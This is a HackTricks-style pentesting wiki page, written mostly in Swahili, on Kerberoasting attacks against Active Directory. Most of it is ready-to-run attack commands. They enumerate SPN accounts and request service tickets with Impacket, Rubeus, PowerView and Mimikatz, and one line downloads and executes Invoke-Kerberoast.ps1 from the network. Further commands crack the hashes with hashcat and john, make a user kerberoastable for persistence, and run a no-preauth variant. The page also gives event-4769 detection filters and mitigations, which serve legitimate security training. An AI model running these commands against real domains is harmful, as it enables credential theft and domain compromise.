# Kerberoast

{{#include ../../banners/hacktricks-training.md}}

## Kerberoast

Kerberoasting inazingatia upatikanaji wa **TGS tickets**, hasa zile zinazohusiana na huduma zinazofanya kazi chini ya **akaunti za mtumiaji** katika **Active Directory (AD)**, ikiondoa **akaunti za kompyuta**. Uthibitisho wa tiketi hizi unatumia funguo zinazotokana na **nywila za mtumiaji**, ikiruhusu uwezekano wa **kuvunja akidi za nje**. Matumizi ya akaunti ya mtumiaji kama huduma yanaonyeshwa na mali ya **"ServicePrincipalName"** isiyo tupu.

Ili kutekeleza **Kerberoasting**, akaunti ya kikoa inayoweza kuomba **TGS tickets** ni muhimu; hata hivyo, mchakato huu hauhitaji **privileges maalum**, na hivyo inapatikana kwa mtu yeyote mwenye **akidi halali za kikoa**.

### Key Points:

- **Kerberoasting** inalenga **TGS tickets** kwa **huduma za akaunti za mtumiaji** ndani ya **AD**.
- Tiketi zilizothibitishwa kwa funguo kutoka **nywila za mtumiaji** zinaweza **kuvunjwa nje**.
- Huduma inatambulika kwa **ServicePrincipalName** ambayo si null.
- **Hakuna privileges maalum** zinazohitajika, ni lazima tu **akidi halali za kikoa**.

### **Attack**

> [!WARNING]
> **Zana za Kerberoasting** kwa kawaida huomba **`RC4 encryption`** wanapofanya shambulio na kuanzisha maombi ya TGS-REQ. Hii ni kwa sababu **RC4 ni** [**dhaifu**](https://www.stigviewer.com/stig/windows_10/2017-04-28/finding/V-63795) na rahisi kuvunjwa nje kwa kutumia zana kama Hashcat kuliko algorithimu nyingine za uthibitisho kama AES-128 na AES-256.\
> Hashi za RC4 (aina 23) huanza na **`$krb5tgs$23$*`** wakati AES-256(aina 18) huanza na **`$krb5tgs$18$*`**.`

#### **Linux**
```bash
# Metasploit framework
msf> use auxiliary/gather/get_user_spns
# Impacket
GetUserSPNs.py -request -dc-ip <DC_IP> <DOMAIN.FULL>/<USERNAME> -outputfile hashes.kerberoast # Password will be prompted
GetUserSPNs.py -request -dc-ip <DC_IP> -hashes <LMHASH>:<NTHASH> <DOMAIN>/<USERNAME> -outputfile hashes.kerberoast
# kerberoast: https://github.com/skelsec/kerberoast
kerberoast ldap spn 'ldap+ntlm-password://<DOMAIN.FULL>\<USERNAME>:<PASSWORD>@<DC_IP>' -o kerberoastable # 1. Enumerate kerberoastable users
kerberoast spnroast 'kerberos+password://<DOMAIN.FULL>\<USERNAME>:<PASSWORD>@<DC_IP>' -t kerberoastable_spn_users.txt -o kerberoast.hashes # 2. Dump hashes
```
Zana zenye vipengele vingi ikiwa ni pamoja na dump ya watumiaji wanaoweza kerberoast:
```bash
# ADenum: https://github.com/SecuProject/ADenum
adenum -d <DOMAIN.FULL> -ip <DC_IP> -u <USERNAME> -p <PASSWORD> -c
```
#### Windows

- **Tathmini watumiaji wanaoweza kuhusishwa na Kerberoast**
```powershell
# Get Kerberoastable users
setspn.exe -Q */* #This is a built-in binary. Focus on user accounts
Get-NetUser -SPN | select serviceprincipalname #Powerview
.\Rubeus.exe kerberoast /stats
```
- **Technique 1: Omba TGS na uondoe kutoka kwa kumbukumbu**
```powershell
#Get TGS in memory from a single user
Add-Type -AssemblyName System.IdentityModel
New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "ServicePrincipalName" #Example: MSSQLSvc/mgmt.domain.local

#Get TGSs for ALL kerberoastable accounts (PCs included, not really smart)
setspn.exe -T DOMAIN_NAME.LOCAL -Q */* | Select-String '^CN' -Context 0,1 | % { New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $_.Context.PostContext[0].Trim() }

#List kerberos tickets in memory
klist

# Extract them from memory
Invoke-Mimikatz -Command '"kerberos::list /export"' #Export tickets to current folder

# Transform kirbi ticket to john
python2.7 kirbi2john.py sqldev.kirbi
# Transform john to hashcat
sed 's/\$krb5tgs\$\(.*\):\(.*\)/\$krb5tgs\$23\$\*\1\*\$\2/' crack_file > sqldev_tgs_hashcat
```
- **Technique 2: Zana za kiotomatiki**
```bash
# Powerview: Get Kerberoast hash of a user
Request-SPNTicket -SPN "<SPN>" -Format Hashcat #Using PowerView Ex: MSSQLSvc/mgmt.domain.local
# Powerview: Get all Kerberoast hashes
Get-DomainUser * -SPN | Get-DomainSPNTicket -Format Hashcat | Export-Csv .\kerberoast.csv -NoTypeInformation

# Rubeus
.\Rubeus.exe kerberoast /outfile:hashes.kerberoast
.\Rubeus.exe kerberoast /user:svc_mssql /outfile:hashes.kerberoast #Specific user
.\Rubeus.exe kerberoast /ldapfilter:'admincount=1' /nowrap #Get of admins

# Invoke-Kerberoast
iex (new-object Net.WebClient).DownloadString("https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Kerberoast.ps1")
Invoke-Kerberoast -OutputFormat hashcat | % { $_.Hash } | Out-File -Encoding ASCII hashes.kerberoast
```
> [!WARNING]
> Wakati tiketi ya TGS inapotakiwa, tukio la Windows `4769 - Tiketi ya huduma ya Kerberos ilitakiwa` inaundwa.

### Kupasua
```bash
john --format=krb5tgs --wordlist=passwords_kerb.txt hashes.kerberoast
hashcat -m 13100 --force -a 0 hashes.kerberoast passwords_kerb.txt
./tgsrepcrack.py wordlist.txt 1-MSSQLSvc~sql01.medin.local~1433-MYDOMAIN.LOCAL.kirbi
```
### Persistence

Ikiwa una **idhini ya kutosha** juu ya mtumiaji unaweza **kufanya iwe kerberoastable**:
```bash
Set-DomainObject -Identity <username> -Set @{serviceprincipalname='just/whateverUn1Que'} -verbose
```
Unaweza kupata **zana** muhimu za **kerberoast** hapa: [https://github.com/nidem/kerberoast](https://github.com/nidem/kerberoast)

Ikiwa unapata **kosa** hili kutoka Linux: **`Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)`** ni kwa sababu ya muda wako wa ndani, unahitaji kusawazisha mwenyeji na DC. Kuna chaguzi chache:

- `ntpdate <IP of DC>` - Imepitwa na wakati tangu Ubuntu 16.04
- `rdate -n <IP of DC>`

### Kupunguza

Kerberoasting inaweza kufanywa kwa kiwango kikubwa cha usiri ikiwa inaweza kutumika. Ili kugundua shughuli hii, umakini unapaswa kulipwa kwa **Kitambulisho cha Tukio la Usalama 4769**, ambacho kinaonyesha kwamba tiketi ya Kerberos imeombwa. Hata hivyo, kutokana na mzunguko mkubwa wa tukio hili, filters maalum zinapaswa kutumika ili kutenga shughuli zinazoshuku:

- Jina la huduma halipaswi kuwa **krbtgt**, kwani hii ni ombi la kawaida.
- Majina ya huduma yanayomalizika na **$** yanapaswa kutengwa ili kuepuka kuingiza akaunti za mashine zinazotumika kwa huduma.
- Maombi kutoka kwa mashine yanapaswa kuchujwa kwa kutengwa kwa majina ya akaunti yaliyoundwa kama **machine@domain**.
- Ni maombi ya tiketi yaliyofanikiwa pekee yanapaswa kuzingatiwa, yanayotambulika kwa msimbo wa kushindwa wa **'0x0'**.
- **Muhimu zaidi**, aina ya usimbaji wa tiketi inapaswa kuwa **0x17**, ambayo mara nyingi hutumiwa katika mashambulizi ya Kerberoasting.
```bash
Get-WinEvent -FilterHashtable @{Logname='Security';ID=4769} -MaxEvents 1000 | ?{$_.Message.split("`n")[8] -ne 'krbtgt' -and $_.Message.split("`n")[8] -ne '*$' -and $_.Message.split("`n")[3] -notlike '*$@*' -and $_.Message.split("`n")[18] -like '*0x0*' -and $_.Message.split("`n")[17] -like "*0x17*"} | select ExpandProperty message
```
Ili kupunguza hatari ya Kerberoasting:

- Hakikisha kwamba **Nywila za Akaunti za Huduma ni ngumu kudhani**, ukipendekeza urefu wa zaidi ya **25 wahusika**.
- Tumia **Akaunti za Huduma Zinazosimamiwa**, ambazo zinatoa faida kama **mabadiliko ya nywila kiotomatiki** na **Usimamizi wa Jina la Kihuduma (SPN) uliopewa mamlaka**, kuimarisha usalama dhidi ya mashambulizi kama haya.

Kwa kutekeleza hatua hizi, mashirika yanaweza kupunguza kwa kiasi kikubwa hatari inayohusiana na Kerberoasting.

## Kerberoast bila akaunti ya kikoa

Katika **Septemba 2022**, njia mpya ya kutumia mfumo ilifichuliwa na mtafiti anayeitwa Charlie Clark, iliyoshirikiwa kupitia jukwaa lake [exploit.ph](https://exploit.ph/). Njia hii inaruhusu kupata **Tiketi za Huduma (ST)** kupitia ombi la **KRB_AS_REQ**, ambalo kwa ajabu halihitaji udhibiti wa akaunti yoyote ya Active Directory. Kimsingi, ikiwa kiongozi ameanzishwa kwa njia ambayo haitaji uthibitisho wa awali—hali inayofanana na inavyojulikana katika ulimwengu wa usalama wa mtandao kama **AS-REP Roasting attack**—sifa hii inaweza kutumika kubadilisha mchakato wa ombi. Kwa haswa, kwa kubadilisha sifa ya **sname** ndani ya mwili wa ombi, mfumo unadanganywa kutoa **ST** badala ya Tiketi ya Kutoa Tiketi iliyosimbwa (TGT).

Mbinu hii imeelezwa kwa kina katika makala hii: [Semperis blog post](https://www.semperis.com/blog/new-attack-paths-as-requested-sts/).

> [!WARNING]
> Lazima utoe orodha ya watumiaji kwa sababu hatuna akaunti halali ya kuuliza LDAP kwa kutumia mbinu hii.

#### Linux

- [impacket/GetUserSPNs.py from PR #1413](https://github.com/fortra/impacket/pull/1413):
```bash
GetUserSPNs.py -no-preauth "NO_PREAUTH_USER" -usersfile "LIST_USERS" -dc-host "dc.domain.local" "domain.local"/
```
#### Windows

- [GhostPack/Rubeus kutoka PR #139](https://github.com/GhostPack/Rubeus/pull/139):
```bash
Rubeus.exe kerberoast /outfile:kerberoastables.txt /domain:"domain.local" /dc:"dc.domain.local" /nopreauth:"NO_PREAUTH_USER" /spn:"TARGET_SERVICE"
```
## Marejeo

- [https://www.tarlogic.com/blog/how-to-attack-kerberos/](https://www.tarlogic.com/blog/how-to-attack-kerberos/)
- [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/t1208-kerberoasting](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/t1208-kerberoasting)
- [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberoasting-requesting-rc4-encrypted-tgs-when-aes-is-enabled](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberoasting-requesting-rc4-encrypted-tgs-when-aes-is-enabled)

{{#include ../../banners/hacktricks-training.md}}
